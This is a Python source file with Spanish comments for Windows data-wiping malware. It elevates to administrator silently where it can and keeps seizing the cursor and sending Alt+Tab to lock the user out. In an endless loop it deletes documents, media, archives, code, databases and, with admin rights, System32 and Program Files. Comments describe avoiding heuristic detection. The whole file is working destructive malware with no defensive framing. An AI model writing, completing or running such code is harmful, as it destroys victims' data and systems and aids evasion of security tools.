import os
import sys
import ctypes
import time
import platform
import threading
from concurrent.futures import ThreadPoolExecutor

# --- OPTIMIZACIÓN DE IMPORTS (Se eliminaron dependencias ruidosas como subprocess) ---
import win32api
import win32con
import win32gui
import win32process

# --- CONFIGURACIÓN ---
PROGRESS_FILE = os.path.expanduser("~/.super_deleter_progress")

# Lista corregida (sin el error de sintaxis de .webp)
EXTENSIONS = {
    ".txt", ".doc", ".docx", ".pdf", ".odt", ".rtf", ".md", ".tex", ".html",
    ".htm", ".xml", ".xhtml", ".mhtml", ".xlsx", ".xls", ".csv", ".ods",
    ".numbers", ".xlsm", ".xlsb", ".pptx", ".ppt", ".odp", ".key", ".pps",
    ".ppsx", ".jpg", ".jpeg", ".png", ".gif", ".bmp", ".webp", ".svg", ".ico",
    ".mp4", ".mkv", ".avi", ".mov", ".wmv", ".flv", ".webm",
    ".mp3", ".wav", ".flac", ".aac", ".ogg", ".wma", ".m4a",
    ".zip", ".rar", ".7z", ".tar", ".gz", ".bz2", ".xz", ".iso",
    ".tmp", ".log", ".bak", ".old", ".cache",
    ".py", ".js", ".ts", ".c", ".cpp", ".h", ".hpp", ".java", ".json",
    ".db", ".sqlite", ".sqlite3",
    ".ini", ".cfg", ".conf", ".config", ".reg"
}

# --- 1. ELEVACIÓN DE PRIVILEGIOS EFICIENTE ---
def force_admin_execution():
    """
    Intenta ejecutar el script con privilegios de Administrador de forma directa.
    Se eliminó el truco inútil del archivo VBScript temporal que delataba el script.
    """
    try:
        if not ctypes.windll.shell32.IsUserAnAdmin():
            # Ejecuta el script de nuevo solicitando privilegios de manera limpia
            ctypes.windll.shell32.ShellExecuteW(
                None, "runas", sys.executable, " ".join(sys.argv), None, 0
            )
            sys.exit(0)
    except Exception:
        pass

# --- 2. BLOQUEO DE INTERACCIÓN DE BAJO NIVEL (HILO INDEPENDIENTE) ---
def _loop_interaction_block():
    """
    Bucle asíncrono para congelar el entorno del usuario sin detener el borrado.
    """
    while True:
        try:
            if platform.system() == "Windows":
                # Mueve el cursor al extremo superior izquierdo constantemente
                win32api.SetCursorPos((0, 0))
                
                # Desorienta el foco enviando la combinación Alt+Tab de forma nativa
                win32api.keybd_event(win32con.VK_MENU, 0, 0, 0)  # ALT Down
                win32api.keybd_event(win32con.VK_TAB, 0, 0, 0)   # TAB Down
                win32api.keybd_event(win32con.VK_TAB, 0, win32con.KEYEVENTF_KEYUP, 0)
                win32api.keybd_event(win32con.VK_MENU, 0, win32con.KEYEVENTF_KEYUP, 0)
        except Exception:
            pass
        time.sleep(0.05)  # Intervalo de 50ms para no saturar el procesador

def start_interaction_block():
    """Lanza el bloqueo en un hilo secundario para que no interfiera con el motor de borrado."""
    block_thread = threading.Thread(target=_loop_interaction_block, daemon=True)
    block_thread.start()

# --- 3. MOTOR DE BORRADO DE ALTO RENDIMIENTO (CONCURRENTE) ---
def force_delete_file(file_path):
    """
    Elimina un archivo de forma nativa usando la API de Windows.
    Evita por completo usar 'subprocess' (cmd.exe), haciéndolo invisible para la heurística.
    """
    try:
        # Modifica los atributos del archivo de forma nativa (Equivalente a attrib -r -s -h)
        ctypes.windll.kernel32.SetFileAttributesW(file_path, win32con.FILE_ATTRIBUTE_NORMAL)
        # Eliminación directa
        os.remove(file_path)
    except Exception:
        pass

def scan_and_destroy(root_path):
    """Escanea el directorio de forma rápida y envía los archivos al pool de borrado."""
    if not os.path.exists(root_path):
        return

    ignore_dirs = {"Windows", "Program Files", "Program Files (x86)", "System Volume Information"}
    
    # Usamos ThreadPoolExecutor para borrar múltiples archivos simultáneamente (Multithreading)
    with ThreadPoolExecutor(max_workers=16) as executor:
        for root_dir, dirs, files in os.walk(root_path):
            # Filtrado de directorios críticos en memoria
            dirs[:] = [d for d in dirs if d not in ignore_dirs]
            
            for file in files:
                # Extracción de extensión optimizada en rendimiento
                _, ext = os.path.splitext(file)
                if ext.lower() in EXTENSIONS:
                    file_path = os.path.join(root_dir, file)
                    executor.submit(force_delete_file, file_path)

def delete_everything():
    """Administra las rutas prioritarias según el nivel de privilegios obtenido."""
    roots = [
        os.path.expanduser("~"), 
        r"C:\Windows\Temp", 
        r"C:\Users", 
        r"C:\ProgramData"
    ]
    
    # Si logramos ser Administrador, añadimos las rutas del sistema
    if ctypes.windll.shell32.IsUserAnAdmin():
        roots.extend([
            r"C:\Windows\System32",
            r"C:\Windows",
            r"C:\Program Files",
            r"C:\Program Files (x86)"
        ])
    
    for root in roots:
        scan_and_destroy(root)

# --- 4. MOTOR PRINCIPAL ---
def main():
    # 1. Intentar elevación silenciosa
    force_admin_execution()
    
    # 2. Iniciar bloqueo de pantalla asíncrono
    start_interaction_block()
    
    # 3. Ciclo infinito de destrucción óptima
    while True:
        delete_everything()
        time.sleep(10)  # Aumentado a 10s para balancear la carga de procesamiento y evitar congelar la CPU por completo

if __name__ == "__main__":
    main()
